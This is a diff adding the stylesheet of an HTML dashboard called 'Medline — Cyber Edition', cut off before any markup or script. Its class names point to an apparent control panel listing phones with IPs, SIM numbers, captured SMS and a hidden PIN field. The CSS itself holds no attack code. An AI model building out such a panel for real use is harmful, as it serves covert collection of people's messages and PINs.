@@ -1,0 +1,990 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Medline &mdash; Cyber Edition</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Exo+2:wght@300;400;500;600;700;800;900&family=Share+Tech+Mono&display=swap');
+:root{
+  --bg:#05090e;--bg2:#080d14;--bg3:#0c1420;--bg4:#101c2e;--bg5:#14243a;
+  --gold:#00d4ff;--gold2:#22e5ff;--gold3:#80f0ff;--gold4:#b8f8ff;
+  --gold-dim:rgba(0,212,255,.14);--gold-glow:rgba(0,212,255,.35);
+  --amber:#0088ff;--copper:#1a5aff;
+  --rose:#ff6b6b;--mint:#00d4aa;--sky:#38bdf8;--lilac:#c084fc;--lime:#a3e635;
+  --text:#d4eef5;--sub:#3a6a8a;--dim:#1a3a50;
+  --border:rgba(0,212,255,.1);--border2:rgba(0,212,255,.28);
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html,body{height:100%;overflow:hidden;background:var(--bg);}
+body{color:var(--text);font-family:'Exo 2',sans-serif;-webkit-font-smoothing:antialiased;}
+::-webkit-scrollbar{width:3px;height:3px;}
+::-webkit-scrollbar-thumb{background:var(--dim);border-radius:3px;}
+::-webkit-scrollbar-thumb:hover{background:var(--sub);}
+@keyframes shimmer{0%{background-position:-400% center}100%{background-position:400% center}}
+@keyframes float{0%,100%{transform:translateY(0) rotate(-1deg)}50%{transform:translateY(-14px) rotate(2deg)}}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes fadeUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+@keyframes msgIn{from{opacity:0;transform:translateX(-12px)}to{opacity:1;transform:translateX(0)}}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.45}}
+@keyframes tailSwing{0%,100%{transform:rotate(-22deg)}50%{transform:rotate(28deg)}}
+@keyframes eyeBlink{0%,85%,100%{transform:scaleY(1)}90%{transform:scaleY(.05)}}
+@keyframes catBounce{0%,100%{transform:translateY(0) scaleY(1)}40%{transform:translateY(-22px) scaleY(1.04)}70%{transform:translateY(-6px) scaleY(.97)}}
+@keyframes catShadow{0%,100%{transform:scaleX(.5);opacity:.3}50%{transform:scaleX(1.05);opacity:.12}}
+@keyframes particle{0%{opacity:.9;transform:translateY(0) scale(1)}100%{opacity:0;transform:translateY(-80px) translateX(var(--dx,15px)) scale(0)}}
+@keyframes numPop{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+@keyframes ripple{0%{transform:scale(0);opacity:.7}100%{transform:scale(3);opacity:0}}
+@keyframes connNew{0%{opacity:0;transform:translateX(-100%)}100%{opacity:1;transform:translateX(0)}}
+@keyframes modalIn{from{opacity:0;transform:scale(.88) translateY(28px)}to{opacity:1;transform:scale(1) translateY(0)}}
+
+/* SETUP */
+#setup{display:flex;align-items:center;justify-content:center;height:100vh;padding:24px;position:relative;overflow:hidden;
+  background:radial-gradient(ellipse at 30% 20%,rgba(0,212,255,.09),transparent 60%),
+             radial-gradient(ellipse at 80% 80%,rgba(0,136,255,.06),transparent 50%),var(--bg);}
+#setup::after{content:'';position:absolute;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,212,255,.015) 2px,rgba(0,212,255,.015) 4px);pointer-events:none;z-index:0;}
+.orb{position:absolute;border-radius:50%;pointer-events:none;filter:blur(70px);animation:float 10s ease-in-out infinite;}
+.o1{width:450px;height:450px;background:rgba(0,212,255,.07);top:-120px;left:-120px;}
+.o2{width:300px;height:300px;background:rgba(0,136,255,.05);bottom:-80px;right:-70px;animation-delay:-4s;}
+.setup-card{background:linear-gradient(160deg,rgba(12,20,32,.98),rgba(8,13,20,.98));
+  border:1px solid var(--border2);border-radius:24px;padding:40px 44px 36px;width:100%;max-width:460px;
+  box-shadow:0 0 0 1px rgba(0,212,255,.06),0 50px 100px rgba(0,0,0,.8),inset 0 1px 0 rgba(0,212,255,.08),0 0 60px rgba(0,212,255,.04);
+  animation:fadeUp .7s cubic-bezier(.22,1,.36,1);position:relative;overflow:hidden;z-index:2;}
+.setup-card::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;
+  background:linear-gradient(90deg,#00d4ff,#22e5ff,#0088ff,#80f0ff,#1a5aff,#00d4ff);
+  background-size:400%;animation:shimmer 3s linear infinite;border-radius:24px 24px 0 0;}
+.cat-stage{display:flex;justify-content:center;align-items:flex-end;height:168px;margin-bottom:20px;position:relative;}
+.cat-sh{position:absolute;bottom:0;left:50%;transform:translateX(-50%);width:88px;height:12px;
+  background:rgba(0,212,255,.18);border-radius:50%;filter:blur(8px);animation:catShadow 1.4s ease-in-out infinite;}
+.cat-wrap{animation:catBounce 1.4s cubic-bezier(.36,.07,.19,.97) infinite;cursor:pointer;position:relative;}
+.cat-wrap:hover .cat-svg{filter:drop-shadow(0 0 28px rgba(0,212,255,.9)) drop-shadow(0 0 50px rgba(0,136,255,.4));}
+.cat-svg{width:142px;height:142px;filter:drop-shadow(0 0 20px rgba(0,212,255,.5)) drop-shadow(0 0 40px rgba(0,212,255,.22));}
+.cp{position:absolute;border-radius:50%;animation:particle var(--dur,2s) ease-out infinite;animation-delay:var(--del,0s);}
+.setup-eyebrow{font-size:11px;font-weight:600;letter-spacing:3px;text-transform:uppercase;color:var(--gold);margin-bottom:6px;display:flex;align-items:center;gap:8px;}
+.setup-eyebrow::before{content:'';width:20px;height:2px;background:linear-gradient(90deg,var(--gold),transparent);border-radius:2px;}
+.setup-h{font-size:32px;font-weight:800;letter-spacing:-.5px;margin-bottom:6px;line-height:1.1;}
+.gold-word{background:linear-gradient(90deg,#00d4ff,#22e5ff,#80f0ff,#00d4ff);background-size:300%;-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:shimmer 2.5s linear infinite;}
+.setup-sub{font-size:13px;color:var(--sub);margin-bottom:26px;line-height:1.65;}
+.fl{display:block;font-size:10px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--sub);margin-bottom:7px;}
+.fi{width:100%;padding:13px 16px;background:rgba(16,28,46,.8);border:1px solid rgba(0,212,255,.14);border-radius:12px;
+  color:var(--text);font-family:'Exo 2',sans-serif;font-size:14px;outline:none;margin-bottom:16px;transition:border-color .2s,box-shadow .2s;}
+.fi:focus{border-color:var(--gold);box-shadow:0 0 0 3px rgba(0,212,255,.1);}
+.fi::placeholder{color:var(--dim);}
+.cta{width:100%;padding:16px;border:none;border-radius:12px;color:#020810;font-family:'Exo 2',sans-serif;font-size:15px;font-weight:800;
+  cursor:pointer;position:relative;overflow:hidden;
+  background:linear-gradient(135deg,#22e5ff,#00d4ff,#0088ff);
+  box-shadow:0 6px 30px rgba(0,212,255,.4),inset 0 1px 0 rgba(255,255,255,.25);
+  transition:all .25s cubic-bezier(.22,1,.36,1);letter-spacing:.3px;}
+.cta:hover{transform:translateY(-3px);box-shadow:0 14px 42px rgba(0,212,255,.55);}
+.cta .rip{position:absolute;border-radius:50%;background:rgba(255,255,255,.3);width:90px;height:90px;margin:-45px;animation:ripple .7s ease-out forwards;pointer-events:none;}
+.s-err{color:var(--rose);font-size:12px;text-align:center;margin-top:12px;display:none;background:rgba(255,107,107,.08);border:1px solid rgba(255,107,107,.2);padding:9px 14px;border-radius:9px;}
+.s-footer{text-align:center;margin-top:20px;font-size:11px;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--dim);}
+.gold-grad{background:linear-gradient(90deg,#00d4ff,#22e5ff,#1a5aff);background-size:300%;-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:shimmer 4s linear infinite;}
+
+/* PANEL */
+#panel{display:none;height:100vh;flex-direction:column;}
+#panel.open{display:flex;}
+.tb{background:linear-gradient(90deg,rgba(8,13,20,.97),rgba(12,18,28,.97));border-bottom:1px solid var(--border);
+  height:52px;display:flex;align-items:center;gap:12px;padding:0 20px;flex-shrink:0;position:relative;}
+.tb::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;
+  background:linear-gradient(90deg,transparent,rgba(0,212,255,.7),rgba(0,136,255,.5),transparent);}
+.tb-dots{display:flex;gap:7px;}
+.td{width:13px;height:13px;border-radius:50%;cursor:pointer;transition:all .18s;}
+.td:hover{filter:brightness(1.3);transform:scale(1.12);}
+.td-r{background:#ff5f57;}.td-y{background:#febc2e;}.td-g{background:#28c840;}
+.tb-logo{font-size:16px;font-weight:800;letter-spacing:-.2px;}
+.tb-gl{background:linear-gradient(90deg,#00d4ff,#22e5ff,#80f0ff,#00d4ff);background-size:300%;-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:shimmer 3.5s linear infinite;}
+.tb-pills{display:flex;gap:6px;margin-right:auto;}
+.pill{font-size:10px;font-weight:700;padding:4px 11px;border-radius:20px;letter-spacing:.3px;}
+.p-t{background:rgba(0,212,255,.12);color:var(--gold2);}
+.p-on{background:rgba(0,212,170,.1);color:var(--mint);}
+.p-off{background:rgba(255,107,107,.09);color:var(--rose);}
+.live-dot{width:8px;height:8px;border-radius:50%;background:var(--mint);box-shadow:0 0 8px var(--mint);animation:pulse 2s infinite;}
+.tb-btn{width:30px;height:30px;background:var(--bg3);border:1px solid var(--border);border-radius:8px;color:var(--sub);font-size:14px;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:all .15s;}
+.tb-btn:hover{color:var(--text);border-color:var(--border2);background:var(--bg4);}
+.body{display:flex;flex:1;overflow:hidden;}
+
+/* SIDEBAR */
+.sb{width:274px;flex-shrink:0;background:linear-gradient(180deg,var(--bg2),var(--bg));border-right:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden;}
+.sb-search{padding:12px 14px;border-bottom:1px solid var(--border);flex-shrink:0;}
+.sb-sbox{display:flex;align-items:center;gap:8px;background:var(--bg3);border:1px solid var(--border);border-radius:10px;padding:9px 13px;transition:border-color .2s;}
+.sb-sbox:focus-within{border-color:var(--gold);}
+.sb-sbox input{flex:1;background:none;border:none;outline:none;color:var(--text);font-family:'Exo 2',sans-serif;font-size:13px;}
+.sb-sbox input::placeholder{color:var(--dim);}
+.sb-filters{display:flex;gap:5px;padding:9px 14px;border-bottom:1px solid var(--border);flex-shrink:0;}
+.sbf{flex:1;padding:7px 4px;background:none;border:1px solid var(--border);border-radius:8px;color:var(--sub);font-family:'Exo 2',sans-serif;font-size:11px;font-weight:600;cursor:pointer;transition:all .2s;text-align:center;}
+.sbf.fa{background:var(--gold-dim);border-color:rgba(0,212,255,.35);color:var(--gold2);}
+.sbf.fon{background:rgba(0,212,170,.1);border-color:rgba(0,212,170,.3);color:var(--mint);}
+.sbf.foff{background:rgba(255,107,107,.08);border-color:rgba(255,107,107,.22);color:var(--rose);}
+.sbf.fpin{background:rgba(192,132,252,.09);border-color:rgba(192,132,252,.25);color:var(--lilac);}
+.sb-list{flex:1;overflow-y:auto;}
+.sec-sep{padding:9px 14px 5px;font-size:10px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--dim);display:flex;align-items:center;gap:7px;background:var(--bg2);position:sticky;top:0;z-index:1;}
+.sec-sep::after{content:'';flex:1;height:1px;background:rgba(0,212,255,.08);}
+.sec-sep.on-sep{color:var(--mint);}
+.dev-item{padding:12px 14px;border-bottom:1px solid rgba(0,212,255,.04);cursor:pointer;transition:background .12s;display:flex;align-items:center;gap:11px;}
+.dev-item.is-new{animation:connNew .4s cubic-bezier(.22,1,.36,1);}
+.dev-item:hover{background:rgba(0,212,255,.04);}
+.dev-item.sel{background:rgba(0,212,255,.08);border-left:3px solid var(--gold);}
+.dev-item.sel .dev-n{color:var(--gold2);}
+.dev-av{width:38px;height:38px;border-radius:10px;background:linear-gradient(135deg,var(--bg4),var(--bg5));border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:17px;flex-shrink:0;position:relative;}
+.av-badge{position:absolute;bottom:-3px;right:-3px;width:12px;height:12px;border-radius:50%;border:2px solid var(--bg2);}
+.dev-meta{flex:1;min-width:0;}
+.dev-n{font-size:13px;font-weight:600;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.dev-i{font-size:10px;color:var(--dim);font-family:'Share Tech Mono',monospace;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-top:2px;}
+.dev-note{font-size:9px;color:var(--gold);background:rgba(0,212,255,.08);border:1px solid rgba(0,212,255,.15);border-radius:5px;padding:1px 6px;margin-top:3px;max-width:100%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;display:block;}
+.dev-right{display:flex;flex-direction:column;align-items:flex-end;gap:4px;flex-shrink:0;}
+.dev-batt{font-size:10px;font-weight:700;padding:2px 7px;border-radius:6px;}
+.new-badge{font-size:9px;font-weight:700;padding:2px 7px;border-radius:5px;background:rgba(0,212,255,.18);color:var(--gold2);}
+.sb-footer{padding:11px 14px;border-top:1px solid var(--border);display:flex;gap:6px;flex-shrink:0;}
+.sfbtn{flex:1;padding:9px 4px;background:var(--bg3);border:1px solid var(--border);border-radius:9px;color:var(--sub);font-family:'Exo 2',sans-serif;font-size:11px;font-weight:600;cursor:pointer;transition:all .18s;text-align:center;}
+.sfbtn:hover{color:var(--text);border-color:rgba(0,212,255,.3);}
+.sfbtn.del:hover{color:var(--rose);border-color:rgba(255,107,107,.3);background:rgba(255,107,107,.06);}
+.sb-brand{text-align:center;padding:7px;font-size:10px;font-weight:700;letter-spacing:2.5px;text-transform:uppercase;color:var(--dim);}
+
+/* MAIN */
+.main{flex:1;display:flex;flex-direction:column;overflow:hidden;}
+.tabs{display:flex;padding:0 18px;background:linear-gradient(90deg,rgba(8,13,20,.98),rgba(12,18,28,.98));border-bottom:1px solid var(--border);flex-shrink:0;gap:2px;}
+.tab{padding:14px 16px;font-size:12px;font-weight:600;color:var(--sub);cursor:pointer;border-bottom:2px solid transparent;transition:all .18s;white-space:nowrap;letter-spacing:.2px;}
+.tab:hover{color:var(--text);}
+.tab.active{color:var(--gold2);border-bottom-color:var(--gold);}
+.tab-body{flex:1;overflow-y:auto;padding:22px;}
+.pane{display:none;}.pane.active{display:block;animation:fadeUp .22s ease;}
+
+/* OVERVIEW */
+.stat-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:13px;margin-bottom:24px;}
+.sc{background:linear-gradient(145deg,var(--bg3),var(--bg2));border:1px solid var(--border);border-radius:20px;padding:22px 20px;position:relative;overflow:hidden;cursor:default;transition:transform .2s cubic-bezier(.22,1,.36,1),box-shadow .2s;}
+.sc:hover{transform:translateY(-4px);box-shadow:0 18px 50px rgba(0,0,0,.5),0 0 30px rgba(0,212,255,.05);}
+.sc::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;border-radius:20px 20px 0 0;}
+.sc-g::before{background:linear-gradient(90deg,#00d4ff,#22e5ff);}
+.sc-a::before{background:linear-gradient(90deg,#00d4aa,#38bdf8);}
+.sc-r::before{background:linear-gradient(90deg,#ff6b6b,#ff8c00);}
+.sc-p::before{background:linear-gradient(90deg,#c084fc,#00d4ff);}
+.sv{font-size:50px;font-weight:800;letter-spacing:-2px;line-height:1;margin-bottom:5px;animation:numPop .4s ease;}
+.sl{font-size:10px;font-weight:600;color:var(--sub);letter-spacing:1px;text-transform:uppercase;}
+.ov-banner{background:linear-gradient(135deg,var(--bg3),var(--bg4));border:1px solid var(--border2);border-radius:20px;
+  padding:22px 26px;margin-bottom:22px;display:flex;align-items:center;gap:22px;position:relative;overflow:hidden;}
+.ov-banner::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;
+  background:linear-gradient(90deg,#00d4ff,#22e5ff,#1a5aff,#00d4aa,#00d4ff);background-size:300%;animation:shimmer 3s linear infinite;border-radius:20px 20px 0 0;}
+.ov-mini-cat{width:72px;height:72px;flex-shrink:0;animation:float 4s ease-in-out infinite;filter:drop-shadow(0 0 12px rgba(0,212,255,.5));}
+.ov-title{font-size:18px;font-weight:800;margin-bottom:8px;}
+.ov-stats{display:flex;gap:16px;flex-wrap:wrap;}
+.ov-s{font-size:12px;color:var(--sub);}.ov-s span{font-weight:700;}
+.ov-s.on span{color:var(--mint);}.ov-s.off span{color:var(--rose);}.ov-s.tot span{color:var(--gold2);}.ov-s.pin span{color:var(--lilac);}
+.sec-hdr{font-size:10px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--sub);margin-bottom:14px;display:flex;align-items:center;gap:10px;}
+.sec-hdr::after{content:'';flex:1;height:1px;background:linear-gradient(90deg,var(--border),transparent);}
+.tbl-wrap{background:var(--bg2);border:1px solid var(--border);border-radius:14px;overflow:hidden;margin-bottom:22px;}
+.tbl-wrap table{width:100%;border-collapse:collapse;}
+.tbl-wrap th{padding:10px 16px;font-size:10px;font-weight:700;letter-spacing:1px;text-transform:uppercase;color:var(--sub);text-align:left;background:var(--bg3);}
+.tbl-wrap td{padding:13px 16px;font-size:12px;border-top:1px solid rgba(0,212,255,.04);font-weight:600;}
+.tbl-wrap tbody tr{cursor:pointer;transition:background .1s;}
+.tbl-wrap tbody tr:hover{background:rgba(0,212,255,.04);}
+
+/* DETAIL */
+.det-hero{background:linear-gradient(145deg,var(--bg3),var(--bg2));border:1px solid var(--border2);border-radius:20px;padding:26px;margin-bottom:20px;display:flex;align-items:center;gap:22px;position:relative;overflow:hidden;}
+.det-hero::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,#00d4ff,#22e5ff,#0088ff,#80f0ff,#1a5aff);background-size:300%;animation:shimmer 3s linear infinite;}
+.dh-icon{width:72px;height:72px;background:linear-gradient(135deg,rgba(0,212,255,.2),rgba(0,136,255,.1));border:1px solid rgba(0,212,255,.3);border-radius:20px;display:flex;align-items:center;justify-content:center;font-size:36px;flex-shrink:0;animation:float 5s ease-in-out infinite;}
+.dh-name{font-size:22px;font-weight:800;letter-spacing:-.3px;margin-bottom:8px;}
+.dh-badges{display:flex;gap:6px;flex-wrap:wrap;}
+.badge{font-size:10px;font-weight:700;padding:3px 9px;border-radius:20px;letter-spacing:.3px;}
+.b-on{background:rgba(0,212,170,.12);color:var(--mint);}
+.b-off{background:rgba(255,107,107,.1);color:var(--rose);}
+.b-gold{background:rgba(0,212,255,.12);color:var(--gold2);}
+.b-sky{background:rgba(56,189,248,.12);color:var(--sky);}
+.b-lilac{background:rgba(192,132,252,.12);color:var(--lilac);}
+.b-lime{background:rgba(163,230,53,.12);color:var(--lime);}
+.batt-hero{text-align:right;flex-shrink:0;}
+.batt-num{font-size:52px;font-weight:800;letter-spacing:-3px;line-height:1;}
+.batt-label{font-size:9px;color:var(--dim);letter-spacing:1.5px;text-transform:uppercase;margin-top:4px;}
+.batt-bar{width:68px;height:5px;background:rgba(255,255,255,.07);border-radius:5px;margin-top:9px;overflow:hidden;}
+.batt-fill{height:100%;border-radius:5px;transition:width .7s cubic-bezier(.22,1,.36,1);}
+.info-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:18px;}
+.ic{background:var(--bg2);border:1px solid var(--border);border-radius:13px;padding:16px;transition:border-color .2s,transform .18s cubic-bezier(.22,1,.36,1);}
+.ic:hover{border-color:var(--border2);transform:translateY(-2px);}
+.ic-l{font-size:9px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--dim);margin-bottom:6px;}
+.ic-v{font-size:16px;font-weight:600;color:var(--text);word-break:break-all;line-height:1.3;}
+.ic-v.mono{font-family:'Share Tech Mono',monospace;font-size:12px;}
+.ic-v.phone{font-size:19px;font-weight:700;}
+.ic-v.ip-v{font-family:'Share Tech Mono',monospace;font-size:13px;color:var(--sky);}
+.note-card{grid-column:1/-1;background:linear-gradient(135deg,rgba(0,212,255,.06),rgba(0,136,255,.03));border:1px solid rgba(0,212,255,.2);border-radius:14px;padding:18px;position:relative;overflow:hidden;}
+.note-card::before{content:'';position:absolute;left:0;top:0;bottom:0;width:4px;background:linear-gradient(180deg,var(--gold),var(--amber));border-radius:14px 0 0 14px;}
+.note-lbl{font-size:9px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--sub);margin-bottom:7px;}
+.note-disp{font-size:17px;font-weight:700;color:var(--gold2);margin-bottom:11px;min-height:22px;word-break:break-word;}
+.note-disp.empty{font-size:13px;color:var(--dim);font-weight:400;font-style:italic;}
+.note-row{display:flex;gap:8px;}
+.note-inp{flex:1;padding:10px 13px;background:rgba(16,28,46,.8);border:1px solid rgba(0,212,255,.2);border-radius:9px;color:var(--text);font-family:'Exo 2',sans-serif;font-size:13px;font-weight:600;outline:none;transition:border-color .2s;}
+.note-inp:focus{border-color:var(--gold);box-shadow:0 0 10px rgba(0,212,255,.15);}
+.note-inp::placeholder{color:var(--dim);}
+.note-save{padding:10px 18px;background:linear-gradient(135deg,rgba(0,212,255,.2),rgba(0,136,255,.15));border:1px solid rgba(0,212,255,.3);border-radius:9px;color:var(--gold);font-family:'Exo 2',sans-serif;font-size:12px;font-weight:700;cursor:pointer;transition:all .18s;}
+.note-save:hover{background:rgba(0,212,255,.3);box-shadow:0 0 16px rgba(0,212,255,.25);}
+.pin-card{grid-column:1/-1;background:linear-gradient(135deg,rgba(192,132,252,.07),rgba(0,212,255,.04));border:1px solid rgba(192,132,252,.22);border-radius:14px;padding:18px;display:flex;align-items:center;gap:16px;position:relative;overflow:hidden;}
+.pin-card::before{content:'';position:absolute;left:0;top:0;bottom:0;width:4px;background:linear-gradient(180deg,var(--lilac),var(--gold));border-radius:14px 0 0 14px;}
+.pin-icon{font-size:28px;flex-shrink:0;}
+.pin-info{flex:1;}
+.pin-lbl{font-size:9px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--dim);margin-bottom:7px;}
+.pin-val{font-size:30px;font-weight:700;font-family:'Share Tech Mono',monospace;color:var(--gold2);letter-spacing:8px;transition:filter .25s,opacity .25s;}
+.pin-val.blurred{filter:blur(10px);opacity:.4;}
+.pin-load{font-size:12px;color:var(--dim);font-style:italic;letter-spacing:normal;}
+.pin-sub{font-size:10px;color:var(--sub);margin-top:5px;font-family:'Share Tech Mono',monospace;}
+.pin-toggle{padding:9px 18px;background:rgba(192,132,252,.1);border:1px solid rgba(192,132,252,.25);border-radius:10px;color:var(--lilac);font-family:'Exo 2',sans-serif;font-size:11px;font-weight:700;cursor:pointer;transition:all .15s;flex-shrink:0;}
+.pin-toggle:hover{background:rgba(192,132,252,.22);}
+.sim-row{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:18px;}
+.sim-card{border:1px solid var(--border);border-radius:14px;padding:18px;position:relative;overflow:hidden;transition:border-color .2s,transform .18s cubic-bezier(.22,1,.36,1);}
+.sim-card:hover{transform:translateY(-2px);}
+.sim-card::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;}
+.sim1{border-color:rgba(0,212,255,.2);}.sim1::before{background:linear-gradient(90deg,var(--gold),var(--gold2));}
+.sim2{border-color:rgba(56,189,248,.2);}.sim2::before{background:linear-gradient(90deg,var(--sky),var(--mint));}
+.sim-n{font-size:9px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:10px;}
+.sim1 .sim-n{color:var(--gold);}.sim2 .sim-n{color:var(--sky);}
+.sim-ph{font-size:20px;font-weight:700;margin-bottom:4px;font-family:'Share Tech Mono',monospace;}
+.sim-ca{font-size:11px;color:var(--sub);}
+.det-actions{display:flex;gap:9px;margin-top:4px;}
+.da{flex:1;padding:13px;border-radius:12px;font-family:'Exo 2',sans-serif;font-size:13px;font-weight:700;cursor:pointer;transition:all .18s cubic-bezier(.22,1,.36,1);border:1px solid;}
+.da:hover{transform:translateY(-2px);}
+.da-m{background:rgba(56,189,248,.1);border-color:rgba(56,189,248,.25);color:var(--sky);}
+.da-m:hover{background:rgba(56,189,248,.2);}
+.da-s{background:rgba(0,212,170,.08);border-color:rgba(0,212,170,.22);color:var(--mint);}
+.da-s:hover{background:rgba(0,212,170,.18);}
+.da-d{padding:13px 16px;background:rgba(255,107,107,.06);border-color:rgba(255,107,107,.18);color:var(--rose);}
+.da-d:hover{background:rgba(255,107,107,.14);}
+
+/* MESSAGES */
+.no-dev{display:flex;flex-direction:column;align-items:center;justify-content:center;height:60vh;gap:14px;color:var(--dim);}
+.no-dev .ei{font-size:58px;animation:float 4s ease-in-out infinite;}
+.no-dev p{font-size:13px;}
+.msg-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;flex-wrap:wrap;gap:8px;}
+.msg-dn{font-size:15px;font-weight:700;}
+.msg-cnt{font-size:11px;color:var(--sub);background:var(--bg3);border:1px solid var(--border);padding:4px 11px;border-radius:20px;}
+.live-b{display:flex;align-items:center;gap:5px;font-size:10px;font-weight:700;color:var(--mint);background:rgba(0,212,170,.1);border:1px solid rgba(0,212,170,.2);padding:4px 10px;border-radius:20px;}
+.live-b .ld{width:6px;height:6px;border-radius:50%;background:var(--mint);animation:pulse 1.5s infinite;}
+.mbtn{padding:6px 13px;background:var(--bg3);border:1px solid var(--border);border-radius:9px;color:var(--sub);font-family:'Exo 2',sans-serif;font-size:11px;font-weight:700;cursor:pointer;transition:all .2s;}
+.mbtn:hover{color:var(--text);border-color:var(--border2);}
+.simbar{display:flex;gap:8px;margin-bottom:14px;background:var(--bg2);border:1px solid var(--border);border-radius:14px;padding:13px 16px;}
+.ms-sim{flex:1;display:flex;align-items:center;gap:9px;}
+.ms-dot{width:9px;height:9px;border-radius:50%;flex-shrink:0;}
+.ms-dot.s1{background:var(--gold);box-shadow:0 0 7px var(--gold);}
+.ms-dot.s2{background:var(--sky);box-shadow:0 0 7px var(--sky);}
+.ms-info{flex:1;min-width:0;}
+.ms-lbl{font-size:9px;font-weight:700;letter-spacing:1px;text-transform:uppercase;color:var(--dim);margin-bottom:3px;}
+.ms-num{font-size:13px;font-weight:700;font-family:'Share Tech Mono',monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.ms-car{font-size:10px;color:var(--sub);}
+.ms-cp{padding:4px 11px;background:var(--bg3);border:1px solid var(--border);border-radius:7px;color:var(--sub);font-family:'Exo 2',sans-serif;font-size:10px;font-weight:700;cursor:pointer;transition:all .15s;flex-shrink:0;}
+.ms-cp:hover{color:var(--text);border-color:var(--border2);}
+.ms-cp.ok{color:var(--mint);border-color:rgba(0,212,170,.3);background:rgba(0,212,170,.08);}
+.ms-div{width:1px;background:var(--border);margin:0 4px;}
+.msg-bar{display:flex;gap:8px;margin-bottom:14px;flex-wrap:wrap;align-items:center;}
+.sbox{flex:1;min-width:180px;display:flex;align-items:center;gap:8px;background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:9px 13px;transition:border-color .2s;}
+.sbox:focus-within{border-color:var(--gold);}
+.sbox input{flex:1;background:none;border:none;outline:none;color:var(--text);font-family:'Exo 2',sans-serif;font-size:13px;}
+.sbox input::placeholder{color:var(--dim);}
+.mfb{padding:8px 14px;background:var(--bg2);border:1px solid var(--border);border-radius:9px;color:var(--sub);font-family:'Exo 2',sans-serif;font-size:12px;font-weight:600;cursor:pointer;transition:all .15s;white-space:nowrap;}
+.mfb.ma{background:var(--gold-dim);border-color:rgba(0,212,255,.35);color:var(--gold2);}
+.mfb:hover:not(.ma){color:var(--text);border-color:var(--border2);}
+.msg-list{display:flex;flex-direction:column;gap:9px;}
+.msg-bub{background:var(--bg2);border:1px solid var(--border);border-radius:13px;padding:15px 18px;transition:border-color .15s,transform .15s;border-left:3px solid transparent;}
+.msg-bub.nm{animation:msgIn .35s ease;}
+.msg-bub:hover{border-color:var(--border2);transform:translateX(3px);}
+.msg-bub.inc{border-left-color:var(--sky);}.msg-bub.out{border-left-color:var(--mint);}
+.msg-meta{display:flex;align-items:center;gap:9px;margin-bottom:9px;flex-wrap:wrap;}
+.msg-sndr{font-size:13px;font-weight:700;font-family:'Share Tech Mono',monospace;}
+.msg-tp{font-size:10px;font-weight:700;padding:2px 8px;border-radius:5px;}
+.mt-i{background:rgba(56,189,248,.12);color:var(--sky);}
+.mt-o{background:rgba(0,212,170,.1);color:var(--mint);}
+.msg-dt{font-size:10px;color:var(--dim);margin-left:auto;font-family:'Share Tech Mono',monospace;}
+.msg-txt{font-size:14px;color:#a0c4d4;line-height:1.65;word-break:break-word;}
+
+/* ALL MESSAGES */
+.ap-bar{height:3px;background:var(--border);border-radius:3px;margin:0 0 10px;overflow:hidden;}
+.ap-fill{height:100%;background:linear-gradient(90deg,var(--gold),var(--amber));border-radius:3px;transition:width .3s ease;}
+.ap-txt{font-size:11px;color:var(--sub);text-align:center;padding:4px 0 8px;}
+.am-scroll{display:flex;flex-direction:column;gap:9px;padding-bottom:20px;}
+.am-card{background:var(--bg2);border:1px solid var(--border);border-radius:13px;padding:15px 18px;display:flex;gap:14px;align-items:flex-start;transition:border-color .15s,transform .15s;border-left:3px solid transparent;animation:msgIn .25s ease;}
+.am-card:hover{border-color:var(--border2);transform:translateX(3px);}
+.am-card.inc{border-left-color:var(--sky);}.am-card.out{border-left-color:var(--mint);}
+.am-left{flex-shrink:0;min-width:92px;max-width:108px;}
+.am-cn{font-size:13px;font-weight:800;color:var(--gold);margin-bottom:2px;}
+.am-id{font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--sub);margin-bottom:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.am-name{font-size:11px;color:var(--dim);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-weight:600;}
+.am-num{font-size:9px;color:var(--dim);font-family:'Share Tech Mono',monospace;margin-top:2px;}
+.am-note{font-size:9px;color:var(--gold);background:rgba(0,212,255,.07);border:1px solid rgba(0,212,255,.14);border-radius:5px;padding:1px 5px;margin-top:3px;display:inline-block;max-width:100%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
